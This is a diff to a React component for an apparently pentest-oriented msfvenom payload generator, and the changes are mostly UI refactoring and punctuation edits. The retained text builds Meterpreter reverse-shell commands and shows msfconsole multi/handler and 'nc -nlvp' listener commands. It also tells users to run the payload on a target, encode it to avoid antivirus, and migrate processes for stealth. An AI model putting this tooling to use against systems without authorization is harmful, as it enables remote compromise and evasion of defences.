@@ -4,6 +4,7 @@ import { useMemo, useState } from "react";
 import { Callout } from "@/components/ui/Callout";
 import { AuthorizedUseNotice } from "@/components/ui/AuthorizedUseNotice";
 import { CopyButton } from "@/components/ui/CopyButton";
+import { CommandBlock, InlineCommandRow } from "@/components/ui/CommandBlock";
 import { Tooltip } from "@/components/ui/Tooltip";
 import { iconButtonClasses, inputClasses, selectClasses, toggleButtonClasses } from "@/components/ui/formClasses";
 import { ArchId, MSFVENOM_ARCHS_BY_ID } from "@/lib/msfvenom/archs";
@@ -47,9 +48,9 @@ const PLATFORM_LABELS: Record<Platform, string> = {
 };
 
 const EXITFUNC_OPTIONS: { id: ExitfuncId; label: string; whyUseIt: string }[] = [
-  { id: "thread", label: "thread (default, stealthy)", whyUseIt: "Exits via thread — the host process stays running, which is less noisy than killing it outright." },
-  { id: "process", label: "process (kills the process)", whyUseIt: "Kills the entire host process on exit — obvious and noisy, but simple." },
-  { id: "seh", label: "seh (legacy)", whyUseIt: "Exits via SEH — an older, less commonly used exit technique." },
+  { id: "thread", label: "thread (default, stealthy)", whyUseIt: "Exits via thread; the host process stays running, which is less noisy than killing it outright." },
+  { id: "process", label: "process (kills the process)", whyUseIt: "Kills the entire host process on exit. Obvious and noisy, but simple." },
+  { id: "seh", label: "seh (legacy)", whyUseIt: "Exits via SEH, an older, less commonly used exit technique." },
 ];
 
 const DEFAULT_PAYLOAD = MSFVENOM_PAYLOADS_BY_ID["windows/meterpreter/reverse_tcp"];
@@ -382,7 +383,7 @@ export function MsfvenomGeneratorTool() {
           {MSFVENOM_TEMPLATES.map((t) => (
             <option key={t.id} value={t.id}>
               {t.label}
-              {t.id === RECOMMENDED_TEMPLATE_ID ? " — ★ Recommended" : ""}
+              {t.id === RECOMMENDED_TEMPLATE_ID ? " (★ Recommended)" : ""}
             </option>
           ))}
         </select>
@@ -425,7 +426,7 @@ export function MsfvenomGeneratorTool() {
         <div>
           <label className="mb-1 flex items-center text-sm font-medium">
             Architecture
-            <Tooltip text="Match this to your target's real architecture — 32-bit payloads run on 64-bit Windows via WoW64, but not the reverse." />
+            <Tooltip text="Match this to your target's real architecture. 32-bit payloads run on 64-bit Windows via WoW64, but not the reverse." />
           </label>
           {payload.archs.length === 0 ? (
             <input value="N/A" disabled className={`${selectClasses} w-full opacity-50`} />
@@ -577,7 +578,7 @@ export function MsfvenomGeneratorTool() {
               onClick={() => setListenerMenuOpen((open) => !open)}
               className={`${selectClasses} min-w-[220px] text-left`}
             >
-              {savedListeners.find((l) => l.id === selectedListenerId)?.label ?? "— Load a saved listener —"}
+              {savedListeners.find((l) => l.id === selectedListenerId)?.label ?? "(Load a saved listener)"}
               <span className="float-right text-zinc-400">▾</span>
             </button>
             {listenerMenuOpen && (
@@ -589,7 +590,7 @@ export function MsfvenomGeneratorTool() {
                     onClick={() => loadListener("")}
                     className="block w-full px-3 py-2 text-left text-sm text-zinc-500 hover:bg-zinc-100 dark:text-zinc-400 dark:hover:bg-zinc-800"
                   >
-                    — None selected —
+                    (None selected)
                   </button>
                   {savedListeners.length === 0 && (
                     <p className="px-3 py-2 text-sm text-zinc-400 dark:text-zinc-500">No saved listeners yet.</p>
@@ -751,7 +752,7 @@ export function MsfvenomGeneratorTool() {
               </p>
             )}
             {!needsFilename && (
-              <p className="mt-1 text-xs text-zinc-500 dark:text-zinc-400">This format prints to the console — no -o filename is generated.</p>
+              <p className="mt-1 text-xs text-zinc-500 dark:text-zinc-400">This format prints to the console; no -o filename is generated.</p>
             )}
           </div>
 
@@ -795,18 +796,17 @@ export function MsfvenomGeneratorTool() {
 
       {generatedSelection && generatedCommand && (
         <div className="flex flex-col gap-4">
-          <div>
-            <div className="mb-1 flex items-center justify-between">
-              <p className="text-xs font-medium uppercase tracking-wide text-zinc-500 dark:text-zinc-400">Command</p>
-              <div className="flex gap-2">
+          <CommandBlock
+            label="Command"
+            command={generatedCommand}
+            actions={
+              <>
                 <CopyButton text={generatedCommand} label="Copy Command" />
                 {generatedBashVariable && <CopyButton text={generatedBashVariable} label="Copy as Bash Variable" />}
                 {generatedListenerParams && <CopyButton text={generatedListenerParams} label="Copy LHOST/LPORT" />}
-              </div>
-            </div>
-            <code className="block rounded border border-zinc-200 bg-white p-3 text-sm break-all whitespace-pre-wrap dark:border-zinc-800 dark:bg-zinc-900">
-              {generatedCommand}
-            </code>
+              </>
+            }
+          >
             <p className="mt-1 text-xs text-zinc-500 dark:text-zinc-400">
               {resolvePayloadId(generatedSelection.payload, generatedSelection.arch)} · {generatedSelection.format.label} ·{" "}
               {generatedSelection.encoder.label}
@@ -814,45 +814,28 @@ export function MsfvenomGeneratorTool() {
             {generatedRisk && (
               <div className="mt-2">
                 <Callout variant="warning">
-                  This payload has no encoding. Antivirus may detect it immediately — consider regenerating with an encoder.
+                  This payload has no encoding. Antivirus may detect it immediately; consider regenerating with an encoder.
                 </Callout>
               </div>
             )}
-          </div>
+          </CommandBlock>
 
           <details className="rounded border border-zinc-200 dark:border-zinc-800" open>
             <summary className="cursor-pointer px-3 py-2 text-sm font-medium">Usage Guide</summary>
             <div className="flex flex-col gap-3 px-3 pb-3 text-sm text-zinc-600 dark:text-zinc-400">
               <p>Once you have your payload, catch it with a matching listener:</p>
-              <div>
-                <p className="mb-1 text-xs font-medium uppercase tracking-wide text-zinc-500 dark:text-zinc-400">Multi/handler (works for all Metasploit payloads)</p>
-                <div className="flex items-center justify-between gap-2">
-                  <code className="block flex-1 rounded border border-zinc-200 bg-white p-2 text-xs break-all dark:border-zinc-800 dark:bg-zinc-900">
-                    {`msfconsole -x "use exploit/multi/handler; set payload ${resolvePayloadId(generatedSelection.payload, generatedSelection.arch)}; set LHOST ${guideLhost}; set LPORT ${guideLport}; run"`}
-                  </code>
-                  <CopyButton
-                    text={`msfconsole -x "use exploit/multi/handler; set payload ${resolvePayloadId(generatedSelection.payload, generatedSelection.arch)}; set LHOST ${guideLhost}; set LPORT ${guideLport}; run"`}
-                  />
-                </div>
-              </div>
-              <div>
-                <p className="mb-1 text-xs font-medium uppercase tracking-wide text-zinc-500 dark:text-zinc-400">
-                  Raw listener (plain, non-Meterpreter shell payloads only)
-                </p>
-                <div className="flex items-center justify-between gap-2">
-                  <code className="block flex-1 rounded border border-zinc-200 bg-white p-2 text-xs break-all dark:border-zinc-800 dark:bg-zinc-900">
-                    {`nc -nlvp ${guideLport}`}
-                  </code>
-                  <CopyButton text={`nc -nlvp ${guideLport}`} />
-                </div>
-              </div>
+              <InlineCommandRow
+                label="Multi/handler (works for all Metasploit payloads)"
+                command={`msfconsole -x "use exploit/multi/handler; set payload ${resolvePayloadId(generatedSelection.payload, generatedSelection.arch)}; set LHOST ${guideLhost}; set LPORT ${guideLport}; run"`}
+              />
+              <InlineCommandRow label="Raw listener (plain, non-Meterpreter shell payloads only)" command={`nc -nlvp ${guideLport}`} />
               <p>
                 Transfer the generated file to the target and execute it. If nothing connects back, check: the listener is running, LHOST is
                 reachable from the target (not 127.0.0.1), and firewall rules on both ends.
               </p>
               <p>
                 Once you have a session, Meterpreter&apos;s <code>migrate &lt;PID&gt;</code> command can move execution into another process (e.g.
-                explorer.exe) for stealth — this is a post-exploitation msfconsole command, not something msfvenom generates.
+                explorer.exe) for stealth. This is a post-exploitation msfconsole command, not something msfvenom generates.
               </p>
             </div>
           </details>
